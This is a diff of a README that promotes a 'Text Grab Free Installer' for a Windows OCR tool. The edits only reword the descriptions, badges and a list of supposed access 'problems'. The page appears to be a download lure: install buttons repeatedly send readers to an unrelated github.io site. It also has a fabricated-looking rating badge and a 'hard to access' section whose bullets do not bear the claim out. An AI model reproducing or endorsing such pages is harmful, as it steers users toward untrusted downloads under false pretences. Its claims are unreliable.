@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-OCR+Tool-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-OCR-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Text Grab Free Installer** — Text Grab is a free Windows utility that captures text from any part of the screen using OCR. Works without internet access, no account required. Full offline installation.
+**💻 Text Grab Free Installer** — Text Grab is a free Windows OCR utility that captures text from anywhere on screen using Windows' built-in OCR engine. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Text Grab](https://img.shields.io/badge/⬇_Install_Text%20Grab-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Text Grab](https://img.shields.io/badge/⬇_Install_Text+Grab-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Text Grab
 
-Text Grab is a free Windows utility that captures text from any part of the screen using OCR. It integrates with Windows 10/11's built-in OCR engine for fast, accurate text extraction from screenshots, images, or locked UI elements.
+Text Grab is a free Windows OCR utility that captures text from anywhere on screen using Windows' built-in OCR engine. Draw a selection over any on-screen text and Text Grab extracts it to the clipboard. Unlike full OCR applications, Text Grab is lightweight, loads quickly, and uses Windows-native capabilities for offline text extraction from screenshots or screen content.
 
 ---
 
 ## ❌ Problem: Text Grab is hard to access
 
-- **Windows Only** — Uses Windows OCR; not available on macOS or Linux
-- **Windows OCR Quality** — Accuracy limited by Windows built-in OCR engine quality
-- **Internet Not Required** — Offline OCR is a strength; also means limited language support
-- **Screen Content Only** — Cannot directly process image files without first displaying them
+- **Windows Only** — Uses Windows-native OCR; no cross-platform version
+- **OCR Accuracy** — Dependent on Windows OCR engine quality for the selected language
+- **Complex Layouts** — Mixed-orientation or complex document layouts may reduce accuracy
+- **Language Support** — OCR languages require Windows language packs installed
 
 ---
 
@@ -81,7 +81,7 @@ Text Grab is a free Windows utility that captures text from any part of the scre
 
 <div align="center">
 
-[![⬇ Install Text Grab](https://img.shields.io/badge/⬇_Install_Text%20Grab-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Text Grab](https://img.shields.io/badge/⬇_Install_Text+Grab-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Text Grab is a free Windows utility that captures text from any part of the scre
 
 ---
 
-**Text Grab Free Installer** — Text Grab is a free Windows utility that captures text from any part of the screen using OCR. Install without internet connection today!
+**Text Grab Free Installer** — Text Grab is a free Windows OCR utility that captures text from anywhere on screen using Windows' built-in OCR engine. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Text Grab](https://img.shields.io/badge/⬇_Install_Text%20Grab-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Text Grab](https://img.shields.io/badge/⬇_Install_Text+Grab-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
